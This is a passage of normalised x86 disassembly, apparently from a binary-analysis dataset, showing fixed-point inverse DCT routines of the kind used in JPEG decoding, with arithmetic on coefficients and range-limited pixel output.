mov [ ebp - 0x44 ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx + 0x14 ]
sub ecx [ eax + 0xc ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0x1c ]
mov [ ebp - 0x3c ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx + 0x4 ]
sub ecx [ eax + 0x1c ]
mov [ ebp - 0x40 ] ecx
mov edx [ ebp - 0x3c ]
add edx [ ebp - 0x44 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x44 ]
imul eax eax 0x16a
sar eax 0x8
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x38 ]
add ecx [ ebp - 0x40 ]
imul ecx ecx 0x1d9
sar ecx 0x8
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x40 ]
imul edx edx 0x115
sar edx 0x8
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x38 ]
imul eax eax 0xfffffd63
sar eax 0x8
add eax [ ebp - 0x34 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x28 ]
sub edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x20 ]
sar ecx 0x5
and ecx 0x3ff
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x58 ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x20 ]
sar edx 0x5
and edx 0x3ff
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x58 ]
mov dl [ ecx + edx ]
mov [ eax + 0x7 ] dl
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x1c ]
sar eax 0x5
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x1c ]
sar ecx 0x5
and ecx 0x3ff
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x58 ]
mov cl [ eax + ecx ]
mov [ edx + 0x6 ] cl
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x18 ]
sar edx 0x5
and edx 0x3ff
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x58 ]
mov dl [ ecx + edx ]
mov [ eax + 0x2 ] dl
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x18 ]
sar eax 0x5
and eax 0x3ff
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x58 ]
mov al [ edx + eax ]
mov [ ecx + 0x5 ] al
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x14 ]
sar ecx 0x5
and ecx 0x3ff
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x58 ]
mov cl [ eax + ecx ]
mov [ edx + 0x4 ] cl
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x14 ]
sar edx 0x5
and edx 0x3ff
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x58 ]
mov dl [ ecx + edx ]
mov [ eax + 0x3 ] dl
mov eax [ ebp - 0x50 ]
add eax 0x20
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov ecx [ ebp - 0x50 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x40 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x5c ]
add edx 0x1
mov [ ebp - 0x5c ] edx
mov edx [ ebp - 0x50 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
movsx ecx [ eax + 0x50 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x48 ]
movsx eax [ edx + 0x60 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x50 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
movsx edx [ ecx + 0x70 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x50 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
movsx ecx [ eax ]
mov edx [ ebp - 0x4c ]
imul ecx [ edx ]
mov [ ebp - 0x160 ] ecx
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x160 ]
mov [ eax ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x160 ]
mov [ edx + 0x20 ] eax
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x160 ]
mov [ ecx + 0x40 ] edx
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x160 ]
mov [ eax + 0x60 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x160 ]
mov [ edx + 0x80 ] eax
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x160 ]
mov [ ecx + 0xa0 ] edx
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x160 ]
mov [ eax + 0xc0 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x160 ]
mov [ edx + 0xe0 ] eax
mov ecx [ ebp - 0x48 ]
add ecx 0x2
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x4c ]
add edx 0x4
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x50 ]
add eax 0x4
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov edx [ ecx ]
sar edx 0x5
and edx 0x3ff
mov eax [ ebp - 0x58 ]
mov cl [ eax + edx ]
mov [ ebp - 0x164 ] cl
mov edx [ ebp - 0x54 ]
mov al [ ebp - 0x164 ]
mov [ edx ] al
mov ecx [ ebp - 0x54 ]
mov dl [ ebp - 0x164 ]
mov [ ecx + 0x1 ] dl
mov eax [ ebp - 0x54 ]
mov cl [ ebp - 0x164 ]
mov [ eax + 0x2 ] cl
mov edx [ ebp - 0x54 ]
mov al [ ebp - 0x164 ]
mov [ edx + 0x3 ] al
mov ecx [ ebp - 0x54 ]
mov dl [ ebp - 0x164 ]
mov [ ecx + 0x4 ] dl
mov eax [ ebp - 0x54 ]
mov cl [ ebp - 0x164 ]
mov [ eax + 0x5 ] cl
mov edx [ ebp - 0x54 ]
mov al [ ebp - 0x164 ]
mov [ edx + 0x6 ] al
mov ecx [ ebp - 0x54 ]
mov dl [ ebp - 0x164 ]
mov [ ecx + 0x7 ] dl
mov eax [ ebp - 0x50 ]
add eax 0x20
mov [ ebp - 0x50 ] eax
jmp r-xdata
sub_42bff0
push ebp
mov ebp esp
sub esp 0x194
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x120 ]
add ecx 0x80
mov [ ebp - 0x48 ] ecx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x50 ]
mov [ ebp - 0x3c ] ecx
lea edx [ ebp - 0x14c ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x4c ] 0x8
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
lea edx [ ebp - 0x14c ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x4c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x38 ]
movsx edx [ ecx + 0x10 ]
test edx edx
jne r-xdata
cmp [ ebp - 0x4c ] 0x8
jge r-xdata
mov ecx [ ebp - 0x38 ]
movsx edx [ ecx + 0x20 ]
mov eax [ ebp - 0x3c ]
imul edx [ eax + 0x40 ]
mov [ ebp - 0x28 ] edx
mov ecx [ ebp - 0x38 ]
movsx edx [ ecx + 0x60 ]
mov eax [ ebp - 0x3c ]
imul edx [ eax + 0xc0 ]
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x2c ]
imul ecx ecx 0x1151
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x2c ]
imul edx edx 0xffffc4df
mov eax [ ebp - 0x24 ]
add eax edx
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0x187e
mov edx [ ebp - 0x24 ]
add edx ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x38 ]
movsx ecx [ eax ]
mov edx [ ebp - 0x3c ]
imul ecx [ edx ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x38 ]
movsx ecx [ eax + 0x40 ]
mov edx [ ebp - 0x3c ]
imul ecx [ edx + 0x80 ]
mov [ ebp - 0x2c ] ecx
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x2c ]
shl eax 0xd
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x2c ]
shl ecx 0xd
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x38 ]
movsx ecx [ eax + 0x70 ]
mov edx [ ebp - 0x3c ]
imul ecx [ edx + 0xe0 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x38 ]
movsx ecx [ eax + 0x50 ]
mov edx [ ebp - 0x3c ]
imul ecx [ edx + 0xa0 ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x38 ]
movsx ecx [ eax + 0x30 ]
mov edx [ ebp - 0x3c ]
imul ecx [ edx + 0x60 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x38 ]
movsx ecx [ eax + 0x10 ]
mov edx [ ebp - 0x3c ]
imul ecx [ edx + 0x20 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x30 ]
imul ecx ecx 0x25a1
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x4 ]
imul edx edx 0x98e
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
imul eax eax 0x41b3
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x6254
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x10 ]
imul edx edx 0x300b
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x24 ]
imul eax eax 0xffffe333
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0xffffadfd
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x2c ]
imul edx edx 0xffffc13b
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x30 ]
imul eax eax 0xfffff384
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x34 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x34 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x28 ]
add edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
add eax edx
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
add edx ecx
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
add ecx eax
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx + 0x400 ]
sar ecx 0xb
mov edx [ ebp - 0x40 ]
mov [ edx ] ecx
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x10 ]
add eax 0x400
sar eax 0xb
mov ecx [ ebp - 0x40 ]
mov [ ecx + 0xe0 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
lea ecx [ eax + edx + 0x400 ]
sar ecx 0xb
mov edx [ ebp - 0x40 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0xc ]
add eax 0x400
sar eax 0xb
mov ecx [ ebp - 0x40 ]
mov [ ecx + 0xc0 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx + 0x400 ]
sar ecx 0xb
mov edx [ ebp - 0x40 ]
mov [ edx + 0x40 ] ecx
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
add eax 0x400
sar eax 0xb
mov ecx [ ebp - 0x40 ]
mov [ ecx + 0xa0 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x20 ]
lea ecx [ eax + edx + 0x400 ]
sar ecx 0xb
mov edx [ ebp - 0x40 ]
mov [ edx + 0x60 ] ecx
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x4 ]
add eax 0x400
sar eax 0xb
mov ecx [ ebp - 0x40 ]
mov [ ecx + 0x80 ] eax
mov edx [ ebp - 0x38 ]
add edx 0x2
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x3c ]
add eax 0x4
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x40 ]
add ecx 0x4
mov [ ebp - 0x40 ] ecx
jmp r-xdata
mov eax [ ebp - 0x38 ]
movsx ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
add eax [ ebp + 0x18 ]
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x40 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4c ]
sub eax 0x1
mov [ ebp - 0x4c ] eax
mov edx [ ebp - 0x38 ]
movsx eax [ edx + 0x30 ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x40 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x40 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x2c ]
imul eax eax 0x1151
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x2c ]
imul ecx ecx 0xffffc4df
mov edx [ ebp - 0x24 ]
add edx ecx
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x28 ]
imul eax eax 0x187e
mov ecx [ ebp - 0x24 ]
add ecx eax
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x40 ]
mov eax [ edx ]
mov ecx [ ebp - 0x40 ]
add eax [ ecx + 0x10 ]
shl eax 0xd
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x40 ]
mov ecx [ edx ]
sub ecx [ eax + 0x10 ]
shl ecx 0xd
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x40 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x40 ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x30 ]
imul eax eax 0x25a1
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x98e
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
imul edx edx 0x41b3
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
imul eax eax 0x6254
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
imul ecx ecx 0x300b
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x24 ]
imul edx edx 0xffffe333
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x28 ]
imul eax eax 0xffffadfd
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x2c ]
imul ecx ecx 0xffffc13b
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x30 ]
imul edx edx 0xfffff384
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x34 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x30 ]
add ecx [ ebp - 0x34 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x24 ]
add edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
add ecx eax
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x24 ]
add edx [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
add eax edx
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
lea eax [ edx + ecx + 0x20000 ]
sar eax 0x12
and eax 0x3ff
mov ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x48 ]
mov al [ edx + eax ]
mov [ ecx ] al
mov ecx [ ebp - 0x14 ]
sub ecx [ ebp - 0x10 ]
add ecx 0x20000
sar ecx 0x12
and ecx 0x3ff
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x48 ]
mov cl [ eax + ecx ]
mov [ edx + 0x7 ] cl
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
lea ecx [ eax + edx + 0x20000 ]
sar ecx 0x12
and ecx 0x3ff
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x48 ]
mov cl [ eax + ecx ]
mov [ edx + 0x1 ] cl
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0xc ]
add edx 0x20000
sar edx 0x12
and edx 0x3ff
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x48 ]
mov dl [ ecx + edx ]
mov [ eax + 0x6 ] dl
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
lea edx [ ecx + eax + 0x20000 ]
sar edx 0x12
and edx 0x3ff
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x48 ]
mov dl [ ecx + edx ]
mov [ eax + 0x2 ] dl
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
add eax 0x20000
sar eax 0x12
and eax 0x3ff
mov ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x48 ]
mov al [ edx + eax ]
mov [ ecx + 0x5 ] al
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
lea eax [ edx + ecx + 0x20000 ]
sar eax 0x12
and eax 0x3ff
mov ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x48 ]
mov al [ edx + eax ]
mov [ ecx + 0x3 ] al
mov ecx [ ebp - 0x20 ]
sub ecx [ ebp - 0x4 ]
add ecx 0x20000
sar ecx 0x12
and ecx 0x3ff
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x48 ]
mov cl [ eax + ecx ]
mov [ edx + 0x4 ] cl
mov edx [ ebp - 0x40 ]
add edx 0x20
mov [ ebp - 0x40 ] edx
jmp r-xdata
mov edx [ ebp - 0x40 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x38 ]
movsx edx [ ecx + 0x40 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x4c ]
add eax 0x1
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x40 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
movsx ecx [ eax + 0x50 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x40 ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x38 ]
movsx eax [ edx + 0x60 ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x40 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x38 ]
movsx edx [ ecx + 0x70 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x40 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
movsx ecx [ eax ]
mov edx [ ebp - 0x3c ]
imul ecx [ edx ]
shl ecx 0x2
mov [ ebp - 0x150 ] ecx
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x150 ]
mov [ eax ] ecx
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x150 ]
mov [ edx + 0x20 ] eax
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x150 ]
mov [ ecx + 0x40 ] edx
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x150 ]
mov [ eax + 0x60 ] ecx
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x150 ]
mov [ edx + 0x80 ] eax
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x150 ]
mov [ ecx + 0xa0 ] edx
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x150 ]
mov [ eax + 0xc0 ] ecx
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x150 ]
mov [ edx + 0xe0 ] eax
mov ecx [ ebp - 0x38 ]
add ecx 0x2
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x3c ]
add edx 0x4
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x40 ]
add eax 0x4
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov ecx [ ebp - 0x40 ]
cmp [ ecx + 0x1c ] 0x0
jne r-xdata
mov edx [ ebp - 0x40 ]
mov eax [ edx ]
add eax 0x10
sar eax 0x5
and eax 0x3ff
mov ecx [ ebp - 0x48 ]
mov dl [ ecx + eax ]
mov [ ebp - 0x154 ] dl
mov eax [ ebp - 0x44 ]
mov cl [ ebp - 0x154 ]
mov [ eax ] cl
mov edx [ ebp - 0x44 ]
mov al [ ebp - 0x154 ]
mov [ edx + 0x1 ] al
mov ecx [ ebp - 0x44 ]
mov dl [ ebp - 0x154 ]
mov [ ecx + 0x2 ] dl
mov eax [ ebp - 0x44 ]
mov cl [ ebp - 0x154 ]
mov [ eax + 0x3 ] cl
mov edx [ ebp - 0x44 ]
mov al [ ebp - 0x154 ]
mov [ edx + 0x4 ] al
mov ecx [ ebp - 0x44 ]
mov dl [ ebp - 0x154 ]
mov [ ecx + 0x5 ] dl
mov eax [ ebp - 0x44 ]
mov cl [ ebp - 0x154 ]
mov [ eax + 0x6 ] cl
mov edx [ ebp - 0x44 ]
mov al [ ebp - 0x154 ]
mov [ edx + 0x7 ] al
mov ecx [ ebp - 0x40 ]
add ecx 0x20
mov [ ebp - 0x40 ] ecx
jmp r-xdata
sub_42c7c0
push ebp
mov ebp esp
sub esp 0x100
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x120 ]
add ecx 0x80
mov [ ebp - 0x34 ] ecx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x50 ]
mov [ ebp - 0x28 ] ecx
lea edx [ ebp - 0xb8 ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x38 ] 0x8
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
jle r-xdata
lea eax [ ebp - 0xb8 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x38 ] 0x0
jmp r-xdata
cmp [ ebp - 0x38 ] 0x4
jne r-xdata
cmp [ ebp - 0x38 ] 0x4
jge r-xdata
mov ecx [ ebp - 0x24 ]
movsx edx [ ecx + 0x10 ]
test edx edx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x38 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
add ecx [ ebp + 0x18 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x2c ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
movsx ecx [ eax ]
mov edx [ ebp - 0x28 ]
imul ecx [ edx ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
shl eax 0xe
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
movsx edx [ ecx + 0x20 ]
mov eax [ ebp - 0x28 ]
imul edx [ eax + 0x40 ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x24 ]
movsx edx [ ecx + 0x60 ]
mov eax [ ebp - 0x28 ]
imul edx [ eax + 0xc0 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x3b21
mov edx [ ebp - 0x1c ]
imul edx edx 0xffffe782
add ecx edx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x24 ]
movsx eax [ edx + 0x70 ]
mov ecx [ ebp - 0x28 ]
imul eax [ ecx + 0xe0 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x24 ]
movsx eax [ edx + 0x50 ]
mov ecx [ ebp - 0x28 ]
imul eax [ ecx + 0xa0 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x24 ]
movsx eax [ edx + 0x30 ]
mov ecx [ ebp - 0x28 ]
imul eax [ ecx + 0x60 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x24 ]
movsx eax [ edx + 0x10 ]
mov ecx [ ebp - 0x28 ]
imul eax [ ecx + 0x20 ]
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x14 ]
imul edx edx 0xfffff93e
mov eax [ ebp - 0x18 ]
imul eax eax 0x2e75
add edx eax
mov ecx [ ebp - 0x1c ]
imul ecx ecx 0xffffba79
add edx ecx
mov eax [ ebp - 0x20 ]
imul eax eax 0x21f9
add edx eax
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x14 ]
imul ecx ecx 0xffffefb0
mov edx [ ebp - 0x18 ]
imul edx edx 0xffffecc2
add ecx edx
mov eax [ ebp - 0x1c ]
imul eax eax 0x1ccd
add ecx eax
mov edx [ ebp - 0x20 ]
imul edx edx 0x5203
add ecx edx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea edx [ ecx + eax + 0x800 ]
sar edx 0xc
mov eax [ ebp - 0x2c ]
mov [ eax ] edx
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x8 ]
add ecx 0x800
sar ecx 0xc
mov edx [ ebp - 0x2c ]
mov [ edx + 0x60 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + eax + 0x800 ]
sar edx 0xc
mov eax [ ebp - 0x2c ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x4 ]
add ecx 0x800
sar ecx 0xc
mov edx [ ebp - 0x2c ]
mov [ edx + 0x40 ] ecx
jmp r-xdata
mov eax [ ebp - 0x24 ]
movsx ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x2
